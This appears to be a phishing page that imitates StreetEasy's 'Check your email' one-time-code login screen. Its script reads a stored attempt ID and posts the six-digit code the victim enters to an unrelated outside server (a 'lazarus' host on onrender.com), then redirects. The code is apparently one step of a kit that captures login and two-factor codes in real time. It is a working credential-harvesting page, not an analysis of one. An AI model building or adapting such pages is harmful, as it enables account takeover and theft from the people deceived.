<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>StreetEasy Login</title>
    <link rel="icon" type="image/png" href="./streeteasy favicon.png">
    <link rel="shortcut icon" href="./streeteasy favicon.png">
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Source+Sans+Pro:wght@200;300;400;600;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --ds-brand: #1876db;
            --ds-brand-light: #056dff;
            --ds-text-primary: #1a1f2c;
            --ds-text-secondary: #62646a;
            --ds-gray-light: #e6e6e6;
            --ds-bg: #f5f5f5;
        }

        body {
            font-family: 'Source Sans Pro', sans-serif;
            background-color: var(--ds-bg);
            color: var(--ds-text-primary);
            -webkit-font-smoothing: antialiased;
        }

        .text-ds-brand { color: var(--ds-brand); }
        .bg-ds-brand { background-color: var(--ds-brand); }
        .hover-bg-ds-brand-light:hover { background-color: var(--ds-brand-light); }
        .border-ds-brand { border-color: var(--ds-brand); }
        .text-ds-text-primary { color: var(--ds-text-primary); }
        .text-ds-text-secondary { color: var(--ds-text-secondary); }
        .border-ds-gray-light { border-color: var(--ds-gray-light); }
    </style>
</head>
<body class="min-h-screen flex flex-col items-center justify-center p-4">

    <div class="w-full max-w-[448px] bg-white p-8 md:p-12 shadow-sm rounded-sm">
        <div class="flex items-center gap-2 mb-10">
            <img src="./streeteasy-logo-blue (2).svg" alt="Logo" class="w-[162.69px] h-[30px] object-contain">
        </div>

        <h1 class="text-[28px] font-bold text-ds-text-primary mb-2">Check your email</h1>
        <p class="text-ds-text-secondary text-base mb-8">Enter the one-time code we sent you.</p>

        <form id="otp-form" class="space-y-6" onsubmit="event.preventDefault()">
            <div class="relative">
                <div class="absolute -top-2.5 left-3 bg-white px-1 z-10">
                    <label class="text-xs font-medium text-ds-brand" for="otp-code">6-digit code*</label>
                </div>
                <input
                    id="otp-code"
                    name="otpCode"
                    type="text"
                    inputmode="numeric"
                    pattern="[0-9]{6}"
                    maxlength="6"
                    autocomplete="one-time-code"
                    required
                    class="w-full px-4 py-3.5 border-2 border-ds-brand rounded-sm text-base focus:outline-none"
                />
            </div>

            <button
                type="submit"
                class="w-full bg-ds-brand hover:bg-[#056dff] text-white font-semibold py-3.5 rounded-sm transition-colors text-base"
            >
                Continue
            </button>
        </form>

        <div class="mt-6 space-y-4">
            <p class="text-ds-text-secondary text-base">
                Didn't receive a code? Check your spam folder or
                <a href="#" class="text-ds-brand font-semibold hover:underline">try again</a>
            </p>

            <div class="w-full border-t border-ds-gray-light my-6"></div>

            <p>
                <a href="#" class="text-ds-brand font-semibold hover:underline text-base">Or enter your password</a>
            </p>

            <p class="text-ds-text-secondary text-base pt-4">
                New to StreetEasy?
                <a href="#" class="text-ds-brand font-semibold hover:underline">Sign up</a>
            </p>
        </div>
    </div>

<script>

const otpForm  = document.getElementById('otp-form');
const otpInput = document.getElementById('otp-code');

otpForm.addEventListener('submit', async (e) => {
    e.preventDefault();

    const code = otpInput.value.trim();
    const attemptId = localStorage.getItem('attemptId');

    if (code.length !== 6 || !attemptId) {
        alert('Enter a valid 6-digit code to continue.');
        return;
    }

    try {
        const response = await fetch('https://lazarus-lxzt.onrender.com/api/submit-code', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ code, attemptId })
        });

        let data = {};
        try {
            data = await response.json();
        } catch (parseError) {
            data = {};
        }

        if (!response.ok) {
            alert(data.message || 'Verification failed. Please try again.');
            return;
        }

        localStorage.removeItem('attemptId');
        location.href = 'index.html';
    } catch (error) {
        alert('Could not verify the code. Please try again.');
    }
});




</script>


</body>
</html>
